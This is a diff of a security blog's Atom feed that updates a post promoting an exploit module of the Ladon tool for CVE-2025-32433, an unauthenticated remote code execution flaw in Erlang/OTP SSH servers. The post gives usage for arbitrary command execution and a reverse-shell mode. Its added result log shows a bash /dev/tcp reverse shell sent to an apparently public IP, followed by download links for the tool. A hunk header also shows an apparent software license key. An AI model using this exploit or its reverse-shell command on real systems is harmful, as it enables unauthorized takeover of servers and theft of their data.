@@ -6,7 +6,7 @@
   <link href="http://k8gege.org/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2025-04-26T16:29:55.508Z</updated>
+  <updated>2025-04-26T16:32:43.238Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -17,13 +17,13 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>〖EXP〗Ladon CVE-2025-32433 Erlang/OTP SSH RCE Exploit</title>
+    <title>〖EXP〗Ladon CVE-2025-32433 Erlang/OTP SSH RCE Exploit 远程代码执行漏洞复现</title>
     <link href="http://k8gege.org/p/CVE-2025-32433.html"/>
     <id>http://k8gege.org/p/CVE-2025-32433.html</id>
     <published>2025-04-26T16:10:00.000Z</published>
-    <updated>2025-04-26T16:29:55.508Z</updated>
+    <updated>2025-04-26T16:32:43.238Z</updated>
     
-    <content type="html"><![CDATA[<h1>CVE-2025-32433 Erlang/OTP SSH RCE EXP</h1><h2 id="Description">Description</h2><p>A serious vulnerability has been identified in the Erlang/OTP SSH server that may allow an attacker to perform unauthenticated remote code execution (RCE). By exploiting a flaw in SSH protocol message handling, a malicious actor could gain unauthorized access to affected systems and execute arbitrary commands without valid credentials. This could lead to compromise of said hosts, allowing for unauthorized access to and manipulation of sensitive data by third parties, or denial-of-service attacks.</p><h2 id="Affected-Versions">Affected Versions</h2><pre><code>OTP-27.3.2 and earlierOTP-26.2.5.10 and earlierOTP-25.3.2.19 and earlier</code></pre><h2 id="Features">Features</h2><ul><li>Exploit Execution: Execute arbitrary commands.</li><li>Reverse Shell: Initiate a bash-based reverse shell.</li></ul><h2 id="Usage">Usage</h2><p>Usage:<br>Ladon CVE-2025-32433 &lt;target_ip&gt; &lt;target_port&gt; [mode] [options]</p><p>Modes:</p><ol><li><p>Command Execution Mode:<br>Ladon CVE-2025-32433 &lt;target_ip&gt; &lt;target_port&gt; cmd “<command>”</p><p>Example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon CVE-2025-32433 192.168.18.9 2222 cmd <span class="string">&quot;id&gt;888.txt&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>Reverse Shell Mode:<br>Ladon CVE-2025-32433 &lt;target_ip&gt; &lt;target_port&gt; shell &lt;local_ip&gt; &lt;local_port&gt;</p><p>Example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon CVE-2025-32433 192.168.18.9 2222 shell 192.168.18.203 4444</span><br></pre></td></tr></table></figure></li></ol><p><img src="%5Ck8img%5Cposts%5Ccve-2025-32433_nc.png" alt="CVE-2025-32433"></p><h3 id="Download">Download</h3><h4 id="LadonGo-ALL-OS">LadonGo (ALL OS)</h4><p><a href="https://github.com/k8gege/LadonGo/releases">https://github.com/k8gege/LadonGo/releases</a></p><h4 id="Ladon-Windows-Cobalt-Strike">Ladon (Windows &amp; Cobalt Strike)</h4><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a><br>911版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a></p><h2 id="References">References</h2><p><a href="https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2">GitHub Advisory</a></p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32433">NVD CVE-2025-32433</a></p><p><a href="https://platformsecurity.com/blog/CVE-2025-32433-poc">Platform Security</a></p>]]></content>
+    <content type="html"><![CDATA[<h1>CVE-2025-32433 Erlang/OTP SSH RCE EXP</h1><h2 id="Description">Description</h2><p>A serious vulnerability has been identified in the Erlang/OTP SSH server that may allow an attacker to perform unauthenticated remote code execution (RCE). By exploiting a flaw in SSH protocol message handling, a malicious actor could gain unauthorized access to affected systems and execute arbitrary commands without valid credentials. This could lead to compromise of said hosts, allowing for unauthorized access to and manipulation of sensitive data by third parties, or denial-of-service attacks.</p><h2 id="Affected-Versions">Affected Versions</h2><pre><code>OTP-27.3.2 and earlierOTP-26.2.5.10 and earlierOTP-25.3.2.19 and earlier</code></pre><h2 id="Features">Features</h2><ul><li>Exploit Execution: Execute arbitrary commands.</li><li>Reverse Shell: Initiate a bash-based reverse shell.</li></ul><h2 id="Usage">Usage</h2><p>Usage:<br>Ladon CVE-2025-32433 &lt;target_ip&gt; &lt;target_port&gt; [mode] [options]</p><p>Modes:</p><ol><li><p>Command Execution Mode:<br>Ladon CVE-2025-32433 &lt;target_ip&gt; &lt;target_port&gt; cmd “<command>”</p><p>Example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon CVE-2025-32433 192.168.18.9 2222 cmd <span class="string">&quot;id&gt;888.txt&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>Reverse Shell Mode:<br>Ladon CVE-2025-32433 &lt;target_ip&gt; &lt;target_port&gt; shell &lt;local_ip&gt; &lt;local_port&gt;</p><p>Example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon CVE-2025-32433 192.168.18.9 2222 shell 192.168.18.203 4444</span><br></pre></td></tr></table></figure></li></ol><h3 id="Result">Result</h3><pre><code class="language-bash">C:\Users\Administrator\Desktop\Ladon12&gt;Ladon CVE-2025-32433 185.164.148.243 7777 shell 192.168.1.1 4444Load CVE-2025-32433[*] Sending reverse shell to connect back to 192.168.1.1:4444[*] Connecting to target...[+] Received banner: SSH-2.0-Erlang/4.7.6.3[+] Running command: os:cmd(&quot;bash -c 'exec 5&lt;&gt;/dev/tcp/192.168.1.1/4444; cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done'&quot;).[√] Exploit sent. If vulnerable, command should execute.[+] Reverse shell command sent. Check your listener.```bash![CVE-2025-32433](\k8img\posts\cve-2025-32433_nc.png)### Download#### LadonGo (ALL OS)https://github.com/k8gege/LadonGo/releases#### Ladon (Windows &amp; Cobalt Strike)历史版本: https://github.com/k8gege/Ladon/releases911版本：http://k8gege.org/Download## References[GitHub Advisory](https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2)[NVD CVE-2025-32433](https://nvd.nist.gov/vuln/detail/CVE-2025-32433)[Platform Security](https://platformsecurity.com/blog/CVE-2025-32433-poc)</code></pre>]]></content>
     
     
       
@@ -72,9 +72,9 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     
     
     
-    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
-    
     <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
     
     
     <category term="DeepSeek" scheme="http://k8gege.org/tags/DeepSeek/"/>
@@ -107,9 +107,9 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     
     
     
-    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
-    
     <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
     
     
     <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
@@ -142,9 +142,9 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     
     
     
-    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
-    
     <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
     
     
     <category term="CVE-2024-47575" scheme="http://k8gege.org/tags/CVE-2024-47575/"/>
@@ -171,9 +171,9 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     
     
     
-    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
-    
     <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
     
     
     <category term="Apache Solr" scheme="http://k8gege.org/tags/Apache-Solr/"/>
@@ -230,9 +230,9 @@ JU090-6039P-08409-8J0QH-2YR7F&lt;/p&gt;
     
     
     
-    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
-    
     <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
     
     
     <category term="Zyxel" scheme="http://k8gege.org/tags/Zyxel/"/>
